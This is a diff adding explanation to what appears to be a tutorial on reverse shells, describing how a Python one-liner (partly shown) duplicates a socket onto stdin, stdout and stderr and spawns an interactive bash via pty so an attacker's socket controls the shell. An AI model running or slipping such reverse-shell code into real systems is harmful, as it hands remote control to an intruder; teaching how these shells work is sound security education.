@@ -489,6 +489,13 @@ os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
 import pty; pty.spawn("bash")'
 ```
 Same core idea: connects to an IP, redirects I/O via `dup2`, and spawns an interactive bash shell using `pty`.
+`os.dup2(s.fileno(), fd)` duplicates the socket's file descriptor to standard input (`fd=0`), standard output (`fd=1`), and standard error (`fd=2`).
+- `0` → stdin (input stream)
+- `1` → stdout (output stream)
+- `2` → stderr (error stream)
+This means the shell's I/O is now redirected to the attacker’s socket, allowing full interaction.
+- `pty.spawn("bash")` spawns an interactive `bash` shell.
+- The `pty` (pseudo-terminal) module makes the shell behave like a real terminal, supporting terminal features like clear screen, command history, and interactive input.
 
 ---
 
